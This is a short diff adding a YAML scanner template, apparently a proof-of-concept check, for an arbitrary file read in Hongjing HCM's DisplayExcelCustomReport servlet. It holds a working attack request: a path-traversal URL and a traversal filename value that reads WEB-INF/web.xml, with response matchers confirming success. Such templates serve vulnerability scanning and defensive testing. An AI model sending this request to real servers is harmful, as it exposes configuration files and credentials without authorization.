@@ -1,0 +1,17 @@
+name: 宏景HCM-DisplayExcelCustomReport-文件读取
+description: >-
+  文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /templates/attestation/../../servlet/DisplayExcelCustomReport
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: >-
+      filename=../webapps/ROOT/WEB-INF/web.xml
+    expression:
+      status: 200
+      body_all:
+        - "web-app"
+        - "<description>"
